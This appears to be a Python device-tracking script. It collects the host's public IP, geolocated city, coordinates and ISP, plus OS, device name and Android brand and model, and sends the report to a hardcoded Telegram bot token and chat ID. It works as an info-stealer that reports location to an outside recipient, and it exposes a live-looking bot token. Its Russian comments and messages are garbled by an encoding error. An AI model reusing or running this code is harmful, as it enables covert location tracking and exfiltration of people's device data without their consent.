import datetime
import requests
import os
import subprocess
import platform

class TelegramReporter:
    def __init__(self, bot_token, allowed_user_id):
        self.bot_token = bot_token
        self.allowed_user_id = allowed_user_id
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}/"

    def send_message(self, text):
        url = self.base_url + "sendMessage"
        payload = {
            "chat_id": self.allowed_user_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram")
            else:
                print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {response.text}")
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å Telegram: {e}")

class FullDeviceTracker:
    def __init__(self, telegram_reporter):
        self.telegram = telegram_reporter

    def collect_all_info(self):
        report = "üîç *–ü–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ*\n\n"
        
        # –í—Ä–µ–º—è
        current_time = datetime.datetime.now()
        report += f"üïí *–í—Ä–µ–º—è:* `{current_time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
        
        # –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ
        try:
            location_data = requests.get('https://ipinfo.io/json', timeout=5).json()
            report += (
                "\nüåç *–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:*\n"
                f"‚Ä¢ *IP:* `{location_data.get('ip', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}`\n"
                f"‚Ä¢ *–ì–æ—Ä–æ–¥:* `{location_data.get('city', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}`\n"
                f"‚Ä¢ *–°—Ç—Ä–∞–Ω–∞:* `{location_data.get('country', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}`\n"
                f"‚Ä¢ *–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:* `{location_data.get('loc', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}`\n"
                f"‚Ä¢ *–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* `{location_data.get('org', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}`\n"
            )
        except Exception as e:
            report += f"\n‚ùå *–û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è:* `{str(e)}`\n"
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        report += "\nüì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:*\n"
        report += f"‚Ä¢ *–û–°:* `{platform.system()} {platform.release()}`\n"
        report += f"‚Ä¢ *–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞:* `{platform.machine()}`\n"
        report += f"‚Ä¢ *–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:* `{platform.node()}`\n"
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –¥–ª—è Android
        if os.name == 'posix':
            try:
                brand = subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip()
                model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
                report += f"‚Ä¢ *–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å:* `{brand}`\n"
                report += f"‚Ä¢ *–ú–æ–¥–µ–ª—å:* `{model}`\n"
            except:
                report += "‚Ä¢ *–î–∞–Ω–Ω—ã–µ –º–æ–¥–µ–ª–∏:* `–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å`\n"
        
        print(report)
        self.telegram.send_message(report)

if __name__ == "__main__":
    BOT_TOKEN = "8140459609:AAGsjiHT6QQm9fwLMNWQuhzcHdjytIX7Qik"
    ALLOWED_USER_ID = "7656244130"
    
    reporter = TelegramReporter(BOT_TOKEN, ALLOWED_USER_ID)
    tracker = FullDeviceTracker(reporter)
    tracker.collect_all_info()
